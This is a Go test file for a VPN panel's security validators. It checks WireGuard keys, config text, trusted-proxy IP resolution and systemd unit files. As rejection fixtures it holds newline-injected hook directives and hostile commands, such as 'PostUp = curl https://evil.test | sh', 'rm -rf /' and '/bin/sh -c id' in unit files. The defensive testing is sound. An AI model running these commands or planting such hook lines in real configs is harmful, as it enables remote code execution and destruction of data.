package vpnsec

import (
	"net/netip"
	"strings"
	"testing"
)

func TestValidateWireGuardScalarAndKey(t *testing.T) {
	validPriv := "WJBYsg2KO4OHc00UkfDXi79cawNyZNJfPWdtF6vb1mw="
	validPub := "W6WUZ4OXkeTjygoaWIlMnbZBqibaP2lSFzhUeOQ2kVY="

	if err := ValidateWireGuardKey("privateKey", validPriv); err != nil {
		t.Fatalf("expected valid key to pass, got %v", err)
	}
	if err := ValidateWireGuardKey("publicKey", validPub); err != nil {
		t.Fatalf("expected valid public key to pass, got %v", err)
	}

	for _, bad := range []string{
		"",
		"not-a-key",
		validPriv + "\nPostUp = id",
		validPriv + "\r\nPreDown = reboot",
		validPriv + "\x00",
		strings.Repeat("A", 43) + "=", // wait: 44 base64 'A's? Wait: 43 'A's + '=' decodes 32? 'A'*43+'=' in base64 might be invalid padding
	} {
		if bad == strings.Repeat("A", 43)+"=" {
			// Skip ambiguous base64 test string; check explicit invalid lengths & embedded spaces instead.
			bad = "AAAA===="
		}
		if err := ValidateWireGuardKey("k", bad); err == nil {
			t.Fatalf("expected invalid key %q to fail", bad)
		}
	}

	for _, badScalar := range []string{
		"1.2.3.4\nPostUp = /bin/sh",
		"1.2.3.4\r\nPreDown = touch /tmp/pwn",
		"foo\x00bar",
		"[Peer]",
		"PostUp = curl evil.test",
		"pre_down=id",
	} {
		if err := ValidateWireGuardScalar("endpoint", badScalar); err == nil {
			t.Fatalf("expected dangerous scalar %q to be rejected", badScalar)
		}
	}

	if err := ValidateWireGuardScalar("endpoint", "vpn.example.com:51820"); err != nil {
		t.Fatalf("valid endpoint rejected: %v", err)
	}
}

func TestValidateWireGuardScalars(t *testing.T) {
	if err := ValidateWireGuardScalars("endpoint", "vpn.example.com:51820", "dns", "1.1.1.1,8.8.8.8", "psk", ""); err != nil {
		t.Fatalf("expected valid scalars to pass, got %v", err)
	}
	if err := ValidateWireGuardScalars("endpoint", "vpn.example.com:51820", "dns", "1.1.1.1\nPostUp = id"); err == nil {
		t.Fatalf("expected second pair newline injection to fail")
	}
}

func TestValidateWireGuardConfTextRejectsHookDirectives(t *testing.T) {
	goodConf := `[Interface]
PrivateKey = WJBYsg2KO4OHc00UkfDXi79cawNyZNJfPWdtF6vb1mw=
Address = 10.66.66.2/32
DNS = 1.1.1.1

[Peer]
PublicKey = W6WUZ4OXkeTjygoaWIlMnbZBqibaP2lSFzhUeOQ2kVY=
Endpoint = 203.0.113.10:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
`
	if err := ValidateWireGuardConfText(goodConf); err != nil {
		t.Fatalf("expected clean conf to validate, got %v", err)
	}

	malicious := []string{
		goodConf + "\nPostUp = curl https://evil.test | sh\n",
		strings.Replace(goodConf, "DNS = 1.1.1.1", "PreUp = /tmp/payload", 1),
		strings.Replace(goodConf, "DNS = 1.1.1.1", "Post_Down = rm -rf /", 1),
		strings.Replace(goodConf, "DNS = 1.1.1.1", "pre-down = id", 1),
		strings.Replace(goodConf, "DNS = 1.1.1.1", "SaveConfig = true", 1),
		"[Service]\nExecStart = /bin/sh\n",
		"bad line without equals\n",
	}
	for i, c := range malicious {
		if err := ValidateWireGuardConfText(c); err == nil {
			t.Fatalf("case %d: expected rejection for injected/malformed conf:\n%s", i, c)
		}
	}
}

func TestParseTrustedProxies(t *testing.T) {
	def, err := ParseTrustedProxies("")
	if err != nil || len(def) != 2 || def[0] != "127.0.0.1/32" || def[1] != "::1/128" {
		t.Fatalf("default trusted proxies = (%v, %v), want [127.0.0.1/32 ::1/128]", def, err)
	}

	none, err := ParseTrustedProxies("none")
	if err != nil || none == nil || len(none) != 0 {
		t.Fatalf("none should yield empty non-nil slice, got (%#v, %v)", none, err)
	}

	custom, err := ParseTrustedProxies("127.0.0.1, 10.0.0.5/8, fd00::/8")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(custom) != 3 || custom[0] != "127.0.0.1/32" || custom[1] != "10.0.0.0/8" || custom[2] != "fd00::/8" {
		t.Fatalf("custom proxies = %v", custom)
	}

	if _, err := ParseTrustedProxies("127.0.0.1, not-an-ip"); err == nil {
		t.Fatalf("expected invalid proxy entry to error")
	}

	prefixes, err := ParseTrustedProxyPrefixes("127.0.0.1, 172.16.0.0/12")
	if err != nil {
		t.Fatal(err)
	}
	if !IsTrustedProxyPeer("127.0.0.1:44321", prefixes) {
		t.Fatalf("expected loopback peer to match")
	}
	if !IsTrustedProxyPeer("[::ffff:172.18.0.2]:8080", prefixes) {
		t.Fatalf("expected v4-mapped v6 peer in 172.16/12 to match")
	}
	if IsTrustedProxyPeer("198.51.100.77:5555", prefixes) {
		t.Fatalf("untrusted public IP must not match")
	}
	if IsTrustedProxyPeer("127.0.0.1:1234", []netip.Prefix{}) {
		t.Fatalf("empty trusted prefix list must match nothing")
	}

	if got := ResolveClientIP("198.51.100.77:5555", "1.1.1.1", "8.8.8.8", prefixes); got != "198.51.100.77" {
		t.Fatalf("untrusted peer ResolveClientIP = %q, want peer IP 198.51.100.77", got)
	}
	if got := ResolveClientIP("127.0.0.1:5555", "203.0.113.5", "8.8.8.8, 203.0.113.5, 172.17.0.2", prefixes); got != "203.0.113.5" {
		t.Fatalf("trusted peer ResolveClientIP = %q, want rightmost untrusted hop 203.0.113.5", got)
	}
	if got := ResolveClientIP("127.0.0.1:5555", "203.0.113.9", "", prefixes); got != "203.0.113.9" {
		t.Fatalf("trusted peer X-Real-IP fallback = %q, want 203.0.113.9", got)
	}
	if got := ResolveClientIP("127.0.0.1:5555", "1.1.1.1", "8.8.8.8", []netip.Prefix{}); got != "127.0.0.1" {
		t.Fatalf("disabled trusted proxies must ignore headers, got %q", got)
	}
}

func TestValidateSystemdServiceParams(t *testing.T) {
	if n, err := ValidateSystemdServiceName("vpn-ui.service"); err != nil || n != "vpn-ui" {
		t.Fatalf("valid name failed: (%q, %v)", n, err)
	}
	for _, bad := range []string{"", "../evil", "a/b", "bad unit", "-starts-dash"} {
		if _, err := ValidateSystemdServiceName(bad); err == nil {
			t.Fatalf("expected invalid service name %q to fail", bad)
		}
	}

	exe := "/usr/local/vpn-ui/vpn-ui"
	goodUnit := `[Unit]
Description=vpn-ui panel service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/vpn-ui/vpn-ui

[Install]
WantedBy=multi-user.target
`
	if err := ValidateSystemdUnitText(goodUnit, exe); err != nil {
		t.Fatalf("good unit rejected: %v", err)
	}

	for _, badUnit := range []string{
		strings.Replace(goodUnit, "ExecStart=/usr/local/vpn-ui/vpn-ui", "ExecStart=/bin/sh -c id", 1),
		strings.Replace(goodUnit, "Type=simple", "Type=simple\nExecStartPre=/bin/touch /tmp/x", 1),
		strings.Replace(goodUnit, "Type=simple", "Type=simple\nExecStopPost=/bin/id", 1),
		strings.Replace(goodUnit, "ExecStart=/usr/local/vpn-ui/vpn-ui", "ExecStart=/usr/local/vpn-ui/vpn-ui | sh", 1),
		"[Service]\nExecStart=/usr/local/vpn-ui/vpn-ui\n",
	} {
		if err := ValidateSystemdUnitText(badUnit, exe); err == nil {
			t.Fatalf("expected malicious unit to be rejected:\n%s", badUnit)
		}
	}
}
